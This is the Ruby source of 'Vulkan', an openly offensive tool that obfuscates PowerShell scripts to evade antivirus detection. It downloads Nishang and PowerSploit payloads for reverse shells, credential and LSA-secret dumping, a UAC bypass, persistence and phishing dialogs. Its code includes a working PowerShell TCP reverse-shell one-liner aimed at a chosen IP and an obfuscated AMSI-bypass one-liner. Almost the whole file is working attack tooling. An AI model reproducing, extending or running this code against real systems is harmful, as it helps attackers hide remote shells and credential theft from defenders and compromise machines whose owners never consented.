#!/usr/bin/env ruby

# Vulkan: Offensive tool to obfuscate powershell payloads
# Author: D3Ext
# Github: https://github.com/D3Ext
# Blog: https://d3ext.github.io
# Contact: <d3ext@proton.me>

# Use this tool under your own responsability!

require "colorize"
require "httparty"
require "optparse"

# This variable stores generated random strings to avoid collisions
$rand_values = []

# This array contains some of the most important cmdlets to iterate over them in case they're on the script to obfuscate its names
$known_funcs = ["Write-Verbose","Write-Output","Write-Error","Write-Warning","Get-Location","Out-String","Out-Null","Get-Command","Invoke-Expression","IEX","Get-ProcAddress","Copy-Item","New-Object","Get-ItemProperty","Get-Item","Set-ItemProperty","Get-ChildItem","Get-Content","Add-Member","Get-RegKeyClass","Set-Acl","Select-String","Test-Path","Add-Type","Get-WmiObject","Remove-Item","Select-Object","Write-Host","Get-Job","Remove-Job","Start-Job","Start-Sleep","ForEach-Object","Write-Progress","Get-Process","Get-Date","Out-File","Get-Service","Split-Path","New-Item","Set-WmiInstance"]

# Common procedures to lightly change
$known_text = ["([text.encoding]::ASCII).GetBytes(",".AcceptTcpClient()",".GetStream()",".Clear()",".Flush()",".Stop()",".Close()","",".GetString(",".DownloadString(",".setRequestHeader("]

# This array holds all powershell internal variables to avoid overwriting them
# see here https://ss64.com/ps/syntax-automatic-variables.html
$forbidden_vars = ["$true","$false","$null","$env","$read","$error","$verb","$_","$script","$iswow64","$iswow64process","$$","$?","$^","$args","$consolefilename","$event","$eventargs","$foreach","$home","$host","$input","$iscoreclr","$lastexitcode","$matches","$pid","$profile","$psboundparameters","$pscmdlet","$pshome","$pwd","$shellid","$switch","$this","$entrypoint","$errorview","$ofs","$pscommandpath","$psitem","$psscriptroot","$psversiontable","$stacktrace","$psdebugcontext","$myinvocation","$islinux","$iswindows","$eventsubscriber","$allnodes","$dllname","$namespace","$module"]

# This array contains all powershell characters with special uses when are combined with a backtick --> `
$no_backticks = ["0","a","b","e","f","n","r","t","v","-","_",".",":","!","(",")","{","}","[","]","^","`"]

# This array contains already obfuscated integers to avoid errors
$obfs_ints = []

# Arrays to avoid C code
$c_code = []
$rand_c_code = []

$c_code2 = []
$rand_c_code2 = []

$c_code3 = []
$rand_c_code3 = []

$extreme = false
$verbose = false
$first_iter = true

# Print ASCII art banner
def ascii()
  banner = '╦  ╦┬ ┬┬  ┬┌─┌─┐┌┐┌
╚╗╔╝│ ││  ├┴┐├─┤│││
 ╚╝ └─┘┴─┘┴ ┴┴ ┴┘└┘
    by D3Ext v0.1
  '
  puts banner.red
end

# Generate a random string based on given length
# see here https://stackoverflow.com/questions/88311/how-to-generate-a-random-string-in-ruby
def randStr(num)
  o = [('a'..'z'), ('A'..'Z')].map(&:to_a).flatten
  
  if num < 3
    num = 4
  end

  while true
    # Add some randomization by
    # substracting 1, adding 1 or nothing
    x = (1..3).to_a.sample

    case x
    when 1
      rand_str = (0...(num - 1)).map { o[rand(o.length)] }.join
    when 2
      rand_str = (0...(num + 1)).map { o[rand(o.length)] }.join
    when 3
      rand_str = (0...num).map { o[rand(o.length)] }.join
    end

    if $rand_values.include?(rand_str) == false
      $rand_values.append(rand_str)
      break
    end
    
    $rand_values.append(rand_str)
  end

  return rand_str
end

# This function receives a string, iterates
# over its characters using random numbers
# between 1 and 2 and then checks if it's
# even or odd to lowercase or upcase the character
# (i.e. Get-Command to geT-COMmaNd)
# It also helps with obfuscation specially when
# is combined with other techniques
def randCase(str_to_mod)
  mod_str = ""

  str_to_mod.split("").each { |str_char|
    rand_num = (1..2).to_a.sample

    if (rand_num % 2) == 0
      mod_str += str_char.downcase
    else
      mod_str += str_char.upcase
    end
  }

  return mod_str
end

def reorderStr(str_to_mod)
  sep_array = str_to_mod.chars.each_slice(3).map(&:join)
  num_array = (1..sep_array.length).to_a
  reordered = num_array.shuffle
  x = 0

  mod_str = "(\""
  reordered.each { |entry|
    mod_str += "{#{entry -1}}"
    num_array[entry -1] = sep_array[x]
    x += 1
  }
  mod_str += "\" -f "

  num_array.each { |value|
    mod_str += "'#{value}',"
  }
  mod_str.chop!
  mod_str += ")"

  return mod_str
end

# Obfuscation technique which adds ` between words
# to avoid static detection but avoid some special
# characters like: `n, `t, `e, `v, `b
# (i.e. Invoke-Mimikatz to `Inv`o`ke-`Mim`i`kat`z)
def addBackticks(str_to_mod)
  moded_str = ""

  str_to_mod.split("").each{ |str_char|
    if $no_backticks.include?(str_char) == true
      moded_str += str_char
      next
    else
      # Use random numbers to obfuscate it
      # as much as possible
      rand_num = (2..4).to_a.sample
      if (rand_num % 2) == 0
        moded_str += "`" + str_char
      else
        moded_str += str_char
      end
    end
  }

  return moded_str
end

# This function uses some powershell tricks
# to represent integers in different formats
def numObfs(num)
  if $extreme == false
    rand_num = (1..3).to_a.sample
  elsif $extreme == true
    rand_num = 3
  end

  if rand_num == 1
    # Use some logic to add and substract numbers
    moded_num = "$("

    zero_n = (1..5).to_a.sample
    zero_n.times do
      rand_num = (1..2).to_a.sample
      if (rand_num % 2) == 0
        moded_num += "+0"
      else
        moded_num += "-0"
      end
    end
    moded_num += "+" + num.to_s + ")"

  elsif rand_num == 2
    # Some simple number formatting
    moded_num = "$((#{num}))"
  elsif rand_num == 3
    # Modified logic from first technique
    sample_num = (2..32).to_a.sample
    iterations = (1..3).to_a.sample
    moded_num = "$(" + (sample_num - 1).to_s + "-" + (sample_num - 1).to_s + "+" + "#{num}"

    iterations.times do
      moded_num += "+" + sample_num.to_s + "-" + sample_num.to_s
    end
    moded_num += ")"
  end

  return moded_num
end

# This function takes care of obfuscating
# cmdlet names (i.e. Invoke-Expression)
# with different techniques
def cmdletObfs(cmdlet)
  if $extreme == false
    rand_num = (1..3).to_a.sample
  elsif $extreme == true
    rand_num = 2
  end

  if rand_num == 1
    moded_str = addBackticks(randCase(cmdlet))
  elsif rand_num == 2
    moded_str = "&([string]::join('', ( ("
    cmdlet.bytes.map { |x|
      moded_str += x.to_s + ","
    }
    moded_str.chop! # Remove trailing comma
    moded_str += ") |%{ ( [" + randCase("char") + "][" + randCase("int") + "] $_)})))"
  elsif rand_num == 3
    raw_str = ""
    moded_str = "&((\""

    cmdlet.split("").each { |char|
      rand_num = (1..4).to_a.sample
      rand_str = randStr(rand_num)

      if (rand_num % 2) == 0
        moded_str += char + rand_str
        raw_str += char + rand_str
      else
        moded_str += rand_str + char
        raw_str += rand_str + char
      end
    }
    moded_str += "\")["
    
    cmdlet.split("").each { |char|
      moded_str += raw_str.index(char).to_s + ","
    }

    moded_str.chop!
    moded_str += "] -join '')"
  end

  return moded_str
end

# This function receives a string,
# obfuscates it with multiple techniques
# and then it return the modified text
def strObfs(str_to_mod)
  # Handle --extreme parameter
  if $extreme == false
    rand_num = (1..2).to_a.sample
  elsif $extreme == true
    rand_num = 2
  end

  if rand_num == 1
    if str_to_mod.kind_of?(Array)
      moded_str = "([" + randCase("string") + "]::join('', ( ("
      str_to_mod[0].bytes.map { |b|
        moded_str += b.to_s + ","
      }
      moded_str.chop! # Remove trailing comma
      moded_str += ") |%{ ( [" + randCase("char") + "][" + randCase("int") + "] $_)})) | % {$_})"
    elsif str_to_mod.kind_of?(String)
      moded_str = "([" + randCase("string") + "]::join('', ( ("
      str_to_mod.bytes.map { |b|
        moded_str += b.to_s + ","
      }
      moded_str.chop! # Remove trailing comma
      moded_str += ") |%{ ( [" + randCase("char") + "][" + randCase("int") + "] $_)})) | % {$_})"
    end
  elsif rand_num == 2
    moded_str = "$("
    if str_to_mod.kind_of?(Array)
      str_to_mod[0].bytes.map { |b|
        moded_str += "[" + randCase("char") + "]" + b.to_s + "+"
      }
      moded_str.chop!
      moded_str += ")"
    elsif str_to_mod.kind_of?(String)
      str_to_mod.bytes.map { |b|
        moded_str += "[" + randCase("char") + "]" + b.to_s + "+"
      }
      moded_str.chop!
      moded_str += ")"
    end
  end

  return moded_str
end

# Auxiliary logging function to create
# simple progress bars with given text
# and some delay
def pBar(text)
  print(text.light_blue)
  3.times do
    sleep 0.2
    print(".".light_blue)
  end
  sleep 0.2
  print("\n")
end

# Receive content to write to file and filename
def writeContent(f_content, output_file)
  f = File.open(output_file, "w")
  f.write(f_content)
end

def listPayloads()
  puts "Payloads                    Categories          Descriptions".red
  puts "--------                    ----------          ------------".red
  puts "Invoke-PowerShellTcp        Shells              Send a reverse shell via TCP to a port of an ip".light_blue
  puts "Invoke-PowerShellTcpOneLine Shells              Send a reverse shell via TCP to a port of an ip (simplified)".light_blue
  puts "Invoke-PowerShellUdp        Shells              Send a reverse shell via UDP to a port of an ip".light_blue
  puts "Get-System                  Privesc             Try to impersonate NT AUTHORITY/SYSTEM account"
  puts "Get-Information             Gather              Get some basic information about the system".light_blue
  puts "Get-WLAN-Keys               Gather              Display Wifi information and its stored credentials".light_blue
  puts "Get-PassHashes              Gather              Dump system credentials from registry hives".light_blue
  puts "Get-LSASecret               Gather              Extract LSA secrets from local computer".light_blue
  puts "Copy-VSS                    Gather              Copy SAM and SYSTEM to a directory".light_blue
  puts "Check-VM                    Gather              Check if system is a Virtual Machine (VM)".light_blue
  puts "Invoke-CredentialsPhish     Gather              Create a fake dialog box to ask for credentials".light_blue
  puts "Invoke-PortScan             Scan                Scan open ports of the given ip".light_blue
  puts "Invoke-PsUACme              Escalation          Execute command(s) bypassing UAC with high privileges".light_blue
  puts "Remove-Update               Escalation          Remove previous updates from system stealthily".light_blue
  puts "Add-Persistence             Utility             Execute a payload on every computer reboot persistently".light_blue
  puts "Download                    Utility             Download given file to user temp directory".light_blue
  puts "Parse_Keys                  Utility             Parse keys logged by Nishang keylogger".light_blue
  puts "Invoke-AmsiBypass           Bypassing           Bypass AMSI with a dynamic one-liner command".light_blue

  exit(0)
end

def getPayload(payload)
  puts "[+] Payload: #{payload}\n".green

  base_url = "https://raw.githubusercontent.com/samratashok/nishang/master/"

  if payload == "Invoke-PowerShellTcp"
    res = HTTParty.get(base_url + "Shells/Invoke-PowerShellTcp.ps1")
  elsif payload == "Invoke-PowerShellTcpOneLine"
    print "[*] Reverse shell ip: ".light_blue
    ip = gets.strip

    print "[*] Reverse shell port: ".light_blue
    port = gets.strip

    return "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

  elsif payload == "Invoke-PowerShellUdp"
    res = HTTParty.get(base_url + "Shells/Invoke-PowerShellUdp.ps1")
  elsif payload == "Invoke-ConPtyShell"
    res = HTTParty.get(base_url + "Shells/Invoke-ConPtyShell.ps1")
  elsif payload == "Get-System"
    res = HTTParty.get("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1")
  elsif payload == "Get-Information"
    res = HTTParty.get(base_url + "Gather/Get-Information.ps1")
  elsif payload == "Get-WLAN-Keys"
    res = HTTParty.get(base_url + "Gather/Get-WLAN-Keys.ps1")
  elsif payload == "Get-PassHashes"
    res = HTTParty.get(base_url + "Gather/Get-PassHashes.ps1")
  elsif payload == "Get-LSASecret"
    res = HTTParty.get(base_url + "Gather/Get-LSASecret.ps1")
  elsif payload == "Copy-VSS"
    res = HTTParty.get(base_url + "Gather/Copy-VSS.ps1")
  elsif payload == "Check-VM"
    res = HTTParty.get(base_url + "Gather/Check-VM.ps1")
  elsif payload == "Invoke-CredentialsPhish"
    res = HTTParty.get(base_url + "Gather/Invoke-CredentialsPhish.ps1")
  elsif payload == "Invoke-PortScan"
    res = HTTParty.get(base_url + "Scan/Invoke-PortScan.ps1")
  elsif payload == "Invoke-PsUACme"
    res = HTTParty.get(base_url + "Escalation/Invoke-PsUACme.ps1")
  elsif payload == "Remove-Update"
    res = HTTParty.get(base_url + "Escalation/Remove-Update.ps1")
  elsif payload == "Add-Persistence"
    res = HTTParty.get(base_url + "Utility/Add-Persistence.ps1")
  elsif payload == "Add-Exfiltration"
    res = HTTParty.get(base_url + "Utility/Add-Exfiltration.ps1")
  elsif payload == "Download"
    res = HTTParty.get(base_url + "Utility/Download.ps1")
  elsif payload == "Parse_Keys"
    res = HTTParty.get(base_url + "Utility/Parse_Keys.ps1")
  elsif payload == "Invoke-AmsiBypass"
    template = "[ReF].\"`A$(" + randCase("echo sse") + ")`mB$(" + randCase("echo L") + ")`Y\".\"g`E$(" + randCase("echo tty") + ")p`E\"(( \"Sy{3}ana{1}ut{4}ti{2}{0}ils\" -f'iUt','gement.A',\"on.Am`s\",'stem.M','oma') ).\"$(" + randCase("echo ge") + ")`Tf`i$(" + randCase("echo El") + ")D\"((\"{0}{2}ni{1}iled\" -f'am','tFa',\"`siI\"),(\"{2}ubl{0}`,{1}{0}\" -f 'ic','Stat','NonP')).\"$(" + randCase("echo Se") + ")t`Va$(" + randCase("echo LUE") + ")\"($(),$(1 -eq 1))"

    return template
  else
    puts "\n[!] Invalid payload".red
    exit 0
  end

  return res.body
end

def parseArgs()
  options = {}
  opt_parser = OptionParser.new do |opts|
    opts.banner = 'Usage: main.rb [options]'
    opts.separator "Example: main.rb -f script.ps1 -o obfuscated.ps1"
    opts.separator ""
    
    opts.on("-f FILE", "--file FILE", "file to obfuscate") do |f|
      options[:file] = f
    end

    opts.on("-o DEST", "--output DEST", "path to write obfuscated script into") do |o|
      options[:output] = o
    end

    opts.on("-i NUMBER", "--iterations NUMBER", "times to obfuscate the script (default: 1)") do |i|
      options[:iterations] = i
    end

    opts.on("-e", "--extreme", "use best obfuscation techniques") do |e|
      options[:extreme]= e
    end

    opts.on("-p PAYLOAD", "--payload PAYLOAD", "choose payload to obfuscate") do |p|
      options[:payload] = p
    end

    opts.on("-l", "--list", "show available pre-loaded payloads") do |l|
      options[:list] = l
    end

    opts.on('-v', '--verbose', 'run verbosely') do |v|
      options[:verbose] = v
    end

  end

  opt_parser.parse!(ARGV)
  return options
end

def obfuscate(file_data)
  # Get all function names using regex
  if $first_iter
    pBar("[*] Replacing defined functions with random names")
  end
  func_list = file_data.scan(/function [A-Za-z0-9\-_:]+/)
  filters_list = file_data.scan(/filter [A-Za-z0-9\-_:]+/)

  func_list = func_list.concat(filters_list)
  func_list = func_list.sort_by { |x| -x.length }

  func_list.each { |var_name|
    # Little delay to let the user read output
    sleep 0.05

    if !var_name.include? ":" # Check if function is defined as local to avoid errors
      func_name = var_name.split(" ")[1]
    else
      func_name = var_name.split(" ")[1].split(":")[1]
    end

    if func_name.length < 5
      next
    end

    # Generate random string to replace with
    rand_name = randStr(func_name.length)
    file_data.gsub!(func_name, rand_name)
    if $verbose && $first_iter
      puts("  " + func_name + " --> " + rand_name)
    end
  }

  if $verbose && $first_iter && func_list.length != 0
    puts()
  end

  # Get all variables
  if $first_iter
    pBar("[*] Finding and replacing variables with random names")
  end
  all_raw_vars = file_data.scan(/\$[A-Za-z0-9_-]+/)
  # Remove duplicates
  all_raw_vars = all_raw_vars.map { |item| item.downcase }
  all_raw_vars.uniq!

  # Delete some needed variables
  $forbidden_vars.each { |v|
    all_raw_vars.delete(v.upcase)
    all_raw_vars.delete(v.downcase)
    # Capitalize variable manually as it starts with $
    all_raw_vars.delete(v[0] + v[1].upcase + v[2..])
  }

  all_raw_vars.each { |u_var|
    if u_var.length <= 2
      next
    end

    sleep 0.002 # Add little delay
    # Generate random string
    rand_var = "$" + randStr(u_var.length)
    file_data.gsub!(/#{Regexp.escape u_var}/i, rand_var)
    # Print verbose info
    if $verbose && $first_iter
      puts("  " + u_var + " --> " + rand_var)
    end
  }

  if $verbose && $first_iter && all_raw_vars.length != 0
    puts()
  end

  # Remove multi-line comments (text between <# and #>)
  if $first_iter
    pBar("[*] Removing comments")
  end
  comments = file_data.scan(/(<#.*?#>)/m)
  comments.each { |str_lines|
    str_lines.each { |entry|
      file_data.gsub!(entry, "")
    }
  }
  # Remove all single line comments
  file_data.gsub!(/^\s*#.*$/, '')
  # Remove empty lines
  file_data.gsub!(/^(?:[\t ]*(?:\r?\n|\r))+/, '')

  # Replace newlines to fix format before obfuscating them
  file_data.gsub!("`r`n", "\n")
  file_data.gsub!("`n", "\n")
  file_data.gsub!("`t", "\t")
  #file_data.gsub!("`\"", "`'")

  # Get CLI parameters to not overwrite them
  parameters = file_data.scan(/ParameterSetName=\"(.*?)\"\)\]/i)

  # Change temporaly C# code with random strings and then we revert the changes
  s_values = file_data.scan(/@\"(.*?)\"@/m)
  more_values = file_data.scan(/@\(\'(.*?)\'\)/m)

  more_values.each { |entry|
    entry.each { |i|
      rand_code_str = randStr(20)
      file_data.gsub!("\'#{i}\'", rand_code_str)

      $c_code2.append(i)
      $rand_c_code2.append(rand_code_str)
    }
  }

  s_values.each { |entry|
    entry.each { |i|
      rand_code_str = randStr(50)
      file_data.gsub!("\"#{i}\"", rand_code_str)

      $c_code.append(i)
      $rand_c_code.append(rand_code_str)
    }
  }

  # Find all strings between double quotes
  if $first_iter
    pBar("[*] Obfuscating strings")
  end
  
  # Get all strings
  double_quote_strs = file_data.scan(/\"(.*?)\"/m)
  single_quote_strs = file_data.scan(/\'(.*?)\'/m)
  all_strs = double_quote_strs#.concat(single_quote_strs)
  all_strs.uniq!

  single_quote_strs.each { |entry|
    entry.each { |i|
      if entry[0].include?("`") || entry[0].include?("$") || entry[0].include?("\\") || entry[0].include?("\"") || entry[0].include?("'")
        next
      end

      rand_code_str = randStr(25)
      file_data.gsub!("\'#{i}\'", rand_code_str)

      $c_code3.append(i)
      $rand_c_code3.append(rand_code_str)
    }
  }

  all_strs.each { |entry|

    if parameters.include?(entry) == false && entry[0] != "" && entry[0].include?("$") == false && entry[0][-1] != "\"" && entry[0][-1] != "'" && entry[0][-1] != "`" && entry[0].length < 300
      #binding.pry
      moded_str = strObfs(entry)
      file_data.gsub!("\"" + entry[0] + "\"", moded_str)
      #file_data.gsub!("\'" + entry[0] + "\'", moded_str)
    end
  }

  if $first_iter
    pBar("[*] Obfuscating cmdlet names")
  end
  $known_funcs.each { |func|
    if file_data.match?(/#{func}/i)
      sleep 0.05 # Add short delay
      modedfunc = cmdletObfs(func)
      file_data.gsub!(/#{func}/i, modedfunc)

      if $verbose && $first_iter
        puts("  " + func + " --> " + modedfunc)
      end
    end
  }

  if $verbose && $first_iter
    puts()
  end

  if $first_iter
    pBar("[*] Obfuscating pipes and pipelines")
  end

  pipe_n = (1..7).to_a.sample
  case pipe_n
  when 1
    file_data.gsub!("|", "|%{$_}|")
  when 2
    file_data.gsub!("|", "|<##>%{$_}|")
  when 3
    file_data.gsub!("|", "|%{$_}<##>|")
  when 4
    file_data.gsub!("|", "|<##>%{$_}<##>|")
  when 5
    file_data.gsub!("|", "|%{;$_}|")
  when 6
    file_data.gsub!("|", "|%{$_;}|")
  when 7
    file_data.gsub!("|", "|%{;$_;}|")
  end

  pipeline_n = (1..10).to_a.sample
  case pipeline_n
  when 1
    file_data.gsub!("$_", "<##>$_")
  when 2
    file_data.gsub!("$_", "$_<##>")
  when 3
    file_data.gsub!("$_", "<##>$_<##>")
  when 4
    file_data.gsub!("$_", "$($_)")
  when 5
    file_data.gsub!("$_", "<##>$($_)")
  when 6
    file_data.gsub!("$_", "$($_)<##>")
  when 7
    file_data.gsub!("$_", "<##>$($_)<##>")
  when 8
    file_data.gsub!("$_", "<#" + randStr((1..4).to_a.sample) + "#>$_")
  when 9
    file_data.gsub!("$_", "$_<#" + randStr((1..4).to_a.sample) + "#>")
  when 10
    file_data.gsub!("$_", "<#" + randStr((1..4).to_a.sample) + "#>$_<#" + randStr((1..4).to_a.sample) + "#>")
  end

  # Replace some text to avoid possible errors
  double_plus = randStr(15)
  double_less = randStr(16)
  file_data.gsub!("++", double_plus)
  file_data.gsub!("--", double_less)

  if $first_iter
    pBar("[*] Obfuscating integers")
  end
  # Get all digits
  all_ints = file_data.scan(/([0-9]\.?\d+)/)
  all_ints.uniq!
  
  x = []

  # Iterate over them
  all_ints.each { |a|
    # Convert to integer and append it to new array
    x.append(a[0].to_i)
  }
  
  # Compare new array values to order them ascendently
  new_list = x.sort { |a, b| b <=> a }
  new_list.uniq!

  # Now iterate over them and obfuscate them
  found = false
  new_list.each { |i|
    if i.to_i > 32 # If less than 32, don't replace
      if file_data.include?("0x#{i.to_s}") || file_data.include?("0x0#{i.to_s}")
        next
      end

      # Avoid overwriting already obfuscated integers
      $obfs_ints.each { |number|
        if number.include?(i.to_s)
          found = true
          break
        end
      }

      if found == true
        next
      end

      found = false

      rand_int = numObfs(i)
      $obfs_ints.append(i.to_s)
      file_data.gsub!(i.to_s, rand_int.to_s)

      total_amount = file_data.scan(/(?=\,#{i.to_s}\,)/).count
      file_data.gsub!(",#{i.to_s},", ",#{rand_int},")
    end
  }

  # Revert previous changes to avoid C code
  $c_code.zip($rand_c_code).each do |src, dst|
    file_data.gsub!(dst, "\"#{src}\"")
  end

  $c_code2.zip($rand_c_code2).each do |src, dst|
    file_data.gsub!(dst, "\'#{src}\'")
  end

  $c_code3.zip($rand_c_code3).each do |src, dst|
    file_data.gsub!(dst, "\'#{src}\'")
  end

  #$c_code2.zip($rand_c_code2).each do |src, dst|
    #file_data.gsub!(dst, "\'#{src}\'")
  #end

  # Replace double + signs to avoid powershell errors
  file_data.gsub!("++","+")
  file_data.gsub!("--", "-")
  file_data.gsub!(double_plus, "++")
  file_data.gsub!(double_less, "--")

  # Change global var value
  $first_iter = false

  # Return obfuscated content
  return file_data
end

def main()
  # Print banner
  ascii()

  # Parse CLI args
  opts = parseArgs()

  # Handle all CLI args
  if opts[:list]
    listPayloads
    exit 0
  end

  if !opts[:file] && !opts[:payload]
    puts "[!] File/payload parameter missing. See --help for help".red
    exit 0
  end

  if !opts[:output]
    puts "[!] Output parameter missing. See --help for help".red
    exit 0
  end

  if opts[:verbose]
    $verbose = true
  end

  if !opts[:iterations]
    iterations = 1
  else
    iterations = opts[:iterations].to_i
  end

  puts "[+] Iterations: #{iterations}".green

  if opts[:extreme]
    $extreme = true
    puts "[+] Extreme obfuscation: Yes".green
  else
    puts "[+] Extreme obfuscation: No".green
  end

  # Open given file or retrieve payload original content
  if opts[:file]
    file = File.open(opts[:file])
    file_data = file.read
    file.close
    puts "[+] File: #{opts[:file]}\n".green

  elsif opts[:payload]
    file_data = getPayload(opts[:payload])

    if opts[:payload] == "Invoke-AmsiBypass"
      writeContent(file_data, opts[:output])
      puts "[+] Obfuscated script written to #{opts[:output]}".green
      exit 0
    end
  end

  # Obfuscate script n times
  iterations.times do
    file_data = obfuscate(file_data)
    $rand_values = []
    $obfs_ints = []
  end

  # Write obfuscated script to given file
  writeContent(file_data, opts[:output])
  puts "[+] Obfuscated script written to #{opts[:output]}".green
end

main()

